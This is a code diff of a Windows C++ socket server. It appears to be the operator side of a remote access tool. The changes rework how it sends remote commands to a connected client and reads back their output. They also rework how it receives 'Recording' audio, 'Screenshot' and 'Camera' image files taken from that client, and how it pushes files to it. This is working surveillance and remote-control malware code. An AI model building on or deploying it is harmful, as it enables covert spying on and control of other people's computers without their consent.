@@ -104,9 +104,9 @@ int main(int argc, char* argv[]) {
 		if (command.empty())continue;
 
 		// send command
-		iResult = send(clientSocket, command.c_str(), command.size(), 0);
+		iResult = send(clientSocket, input.c_str(), input.size(), 0);
 		if (iResult > 0) {
-			printf("[OK] Command sent: %d\n", iResult);
+			printf("[OK] Command sent.\n", iResult);
 		}
 		else if (iResult < 0) {
 			printf("[ERROR] recv. %d\n", WSAGetLastError());
@@ -141,25 +141,34 @@ int main(int argc, char* argv[]) {
 		}
 
 		if (command.compare("Remote") == 0) {
-			//Send remote command
-			iResult = send(clientSocket, option.c_str(), option.size(), 0);
-			if (iResult > 0) {
-				//Receive command output.
-				char* recvBuffer = NULL;
-				do {
-					recvBuffer = (char*)calloc(BUFSIZ, sizeof(char));
+			DWORD bufferSize = 0;
+			char* recvBuffer = NULL;
+			while (1) {
+				//Receive command output size
+				iResult = recv(clientSocket, (char*)&bufferSize, sizeof(bufferSize), 0);
+				if (iResult < 0) {
+					printf("[ERROR] recv command output size. %d\n", WSAGetLastError());
+					break;
+				}
+
+				// check output
+				if (bufferSize == 0) {
+					break;
+				}
+				else {
+					//Receive command output.
+					recvBuffer = (char*)calloc(bufferSize + 1, sizeof(char));
 					if (recvBuffer) {
-						iResult = recv(clientSocket, recvBuffer, BUFSIZ, 0);
-						if (iResult <= 0) {
-							printf("[ERROR] recv file. %d\n", WSAGetLastError());
+						iResult = recv(clientSocket, recvBuffer, bufferSize, 0);
+						if (iResult < 0) {
+							printf("[ERROR] recv command output. %d\n", WSAGetLastError());
 							free(recvBuffer);
 							break;
 						}
 						printf(recvBuffer);
 						free(recvBuffer);
-
 					}
-				} while (iResult > 0);
+				}
 			}
 		}
 
@@ -182,75 +191,139 @@ int main(int argc, char* argv[]) {
 	return 0;
 }
 
-void sendFile(const char* filePath, SOCKET clientSocket) {
-	HANDLE file = CreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
+void sendFile(const char* fileName, SOCKET clientSocket) {
+	DWORD fileSize = 0;
+	HANDLE file = NULL;
+	BOOL isExist = FALSE;
+	int iResult = 0;
+
+	file = CreateFile(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (file == INVALID_HANDLE_VALUE) {
 		printf("[ERROR] open file. %d\n", GetLastError());
+	}
+	else isExist = TRUE;
+
+	//send file exist signal
+	iResult = send(clientSocket, (char*)&isExist, sizeof(isExist), 0);
+	if (iResult != sizeof(isExist)) {
+		printf("[ERROR] send file exist. %d\n", WSAGetLastError());
+		CloseHandle(file);
 		return;
 	}
-	else {
-		DWORD dwByteRead = 0;
-		char* buffer = (char*)calloc(BUFSIZ, sizeof(char));
 
+	if (isExist) {
+		// send file size
+		fileSize = GetFileSize(file, NULL);
+		iResult = send(clientSocket, (char*)&fileSize, sizeof(fileSize), 0);
+		if (iResult != sizeof(fileSize)) {
+			printf("[ERROR] send file size. %d\n", WSAGetLastError());
+			return;
+		}
+
+		DWORD dwByteRead = 0;
+		char* buffer = NULL;
 		// send file content
-		if (buffer) {
-			do {
+		do {
+			buffer = (char*)calloc(BUFSIZ, sizeof(char));
+			if (buffer) {
 				if (ReadFile(file, buffer, BUFSIZ, &dwByteRead, NULL) == FALSE) {
 					printf("[ERROR] read file. %d\n", GetLastError());
-					break;
+					free(buffer);
+					return;
 				}
-				int iSendFile = send(clientSocket, buffer, dwByteRead, 0);
-				if (iSendFile != dwByteRead) {
-					printf("[ERROR] send file. %d\n", WSAGetLastError());
-					break;
+				iResult = send(clientSocket, buffer, dwByteRead, 0);
+				if (iResult != dwByteRead) {
+					printf("[ERROR] send file data. %d\n", WSAGetLastError());
+					free(buffer);
+					return;
 				}
-			} while (dwByteRead > 0);
-		}
+				free(buffer);
+			}
+		} while (dwByteRead > 0);
 		CloseHandle(file);
 	}
 }
-
+// receive file from client and save
 void receiveFile(const char* fileType, SOCKET clientSocket) {
-	char* buffer = NULL;
+	char* buffer = NULL, *filePath = NULL;
 	HANDLE file = NULL;
 	int iResult = 0;
 	DWORD dwByteWritten = 0;
+	DWORD fileSize = 0;
+	BOOL isExist = FALSE;
 
-	time_t t = time(0);
-	char* now = ctime(&t);
-
-	string fileName = "";
-	fileName += fileType;
-	fileName += "-";
-	fileName += now;
-
-	if (strncmp(fileType, "Recording", strlen(fileType) == 0)) {
-		fileName += ".mp3";
-	}
-	if (strncmp(fileType, "Screenshot", strlen(fileType) == 0)) {
-		fileName += ".jpg";
-	}
-	if (strncmp(fileType, "Camera", strlen(fileType) == 0)) {
-		fileName += ".jpg";
+	// get file exist signal from client
+	iResult = recv(clientSocket, (char*)&isExist, sizeof(isExist), 0);
+	if (iResult != sizeof(isExist)) {
+		printf("[ERROR] recv. %d\n", WSAGetLastError());
+		return;
 	}
 
-	do {
-		buffer = (char*)calloc(BUFSIZ, sizeof(char));
-		if (buffer) {
-			iResult = recv(clientSocket, buffer, BUFSIZ, 0);
-			if (iResult <= 0) {
-				printf("[ERROR] recv file. %d\n", WSAGetLastError());
-				free(buffer);
-				return;
-			}
+	if (isExist) {
+		time_t t = time(0);
+		char* now = ctime(&t);
 
-			file = CreateFile(fileName.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		string fileName = "";
+		fileName += fileType;
+		fileName += "-";
+		fileName += now;
 
-			if (file != INVALID_HANDLE_VALUE) {
-				WriteFile(file, buffer, iResult, &dwByteWritten, NULL);
-				CloseHandle(file);
-			}
-			free(buffer);
+		if (strncmp(fileType, "Recording", strlen(fileType) == 0)) {
+			fileName += ".mp3";
 		}
-	} while (iResult > 0);
+		if (strncmp(fileType, "Screenshot", strlen(fileType) == 0)) {
+			fileName += ".jpg";
+		}
+		if (strncmp(fileType, "Camera", strlen(fileType) == 0)) {
+			fileName += ".jpg";
+		}
+
+		file = CreateFile(fileName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (file == INVALID_HANDLE_VALUE) {
+			printf("[ERROR] create file %d\n", GetLastError());
+			return;
+		}
+
+		// receive file size
+		iResult = recv(clientSocket, (char*)&fileSize, sizeof(fileSize), 0);
+		if (iResult != sizeof(fileSize)) {
+			printf("[ERROR] recv file size. %d\n", WSAGetLastError());
+			CloseHandle(file);
+			return;
+		}
+
+		// receive file data and write
+		DWORD tempFileSize = 0;
+		do {
+			buffer = (char*)calloc(BUFSIZ, sizeof(char));
+			if (buffer) {
+				iResult = recv(clientSocket, buffer, BUFSIZ, 0);
+				if (iResult <= 0) {
+					printf("[ERROR] recv file data. %d\n", WSAGetLastError());
+					CloseHandle(file);
+					free(buffer);
+					return;
+				}
+
+				if (WriteFile(file, buffer, iResult, &dwByteWritten, NULL) == FALSE) {
+					printf("[ERROR] write file. %d\n", GetLastError());
+					CloseHandle(file);
+					free(buffer);
+					return;
+				}
+
+				tempFileSize += iResult;
+				free(buffer);
+			}
+		} while (tempFileSize < fileSize);
+
+		if (file != INVALID_HANDLE_VALUE) {
+			filePath = (char*)calloc(MAX_PATH + 1, sizeof(char));
+			GetFinalPathNameByHandle(file, filePath, MAX_PATH, FILE_NAME_NORMALIZED);
+			printf("File saved at %s\n", filePath);
+			free(filePath);
+		}
+		CloseHandle(file);
+	}
+
 }
